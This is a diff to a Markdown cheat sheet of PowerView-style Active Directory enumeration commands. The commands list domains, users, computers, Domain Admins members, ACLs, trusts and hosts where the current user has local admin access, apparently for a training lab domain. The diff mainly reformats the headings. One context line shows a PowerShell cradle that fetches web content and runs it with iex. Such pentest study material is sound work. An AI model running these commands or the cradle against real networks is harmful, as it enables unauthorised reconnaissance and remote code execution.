@@ -38,76 +38,89 @@ sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
 
 
 # Domain Enumerate
-``` Get current domain
+
+**Get current domain**
+``` 
 
 Get-NetDomain
 Get-NetDomain –Domain cyberwarfare.corp
 
 ```
+**Retrieve Current SID and Domain Controller**
 
-``` Retrieve Current SID and Domain Controller 
+```
 
 Get-NetDomainController –Domain cyberwarfare.corp
 Get-DomainSID
 
 ```
+**Retrieve a list of users in the current domain**
 
-```Retrieve a list of users in the current domain
+```
 
 Get-NetUser
 Get-NetUser –UserName emp1
 
 ```
+**Retrieve a list of computers in the current domain**
 
-``` Retrieve a list of computers in the current domain
+``` 
 
 Get-NetComputer
 Get-NetComputer – FullData
 Get-NetComputer –OperatingSystem “Windows Server 2016 Standard”
 
 ```
+**List all domain groups in the current domain**
 
-``` List all domain groups in the current domain
+```
 
 Get-NetGroup
 Get-NetGroup –FullData
 Get-NetGroup –Domain cyberwarfare.corp
 
 ```
+**Enumerate privilege domain group members and local administrators**
 
-``` Enumerate privilege domain group members and local administrators
+``` 
 group members 
 
 Get-NetGroupMember –GroupName “Domain Admins” -verbose
 Get-NetLocalGroup –ComputerName DC-01 -ListGroups
 
 ```
+**ACL Enumeration, get the ACLs associated with an entity**
 
-```ACL Enumeration, get the ACLs associated with an entity
- 
+```
 Get-ObjectAcl -SamAccountName <Domain_User> –ResolveGUIDs
 
 ```
-``` Unique and interesting ACL Scanning
+** Unique and interesting ACL Scanning**
+
+```
 
 Invoke-ACLScanner –ResolveGUIDs
 
 ```
+**Enumerate Domain Trusts**
 
-```Enumerate Domain Trusts
+```
 
 Get-NetDomainTrust
 Get-NetDomainTrust –Domain cyberwarfare.corp
 
 ```
+**Enumerate all domain in a Forest**
 
-```Enumerate all domain in a Forest
+```
 
 Get-NetForestDomain –Verbose
 Get-NetForest -Verbose
 
 ```
-```Find computer sessions where current user has local admin access
+**Find computer sessions where current user has local admin access**
+
+```
 
 Find-LocalAdminAccess -Verbose
 
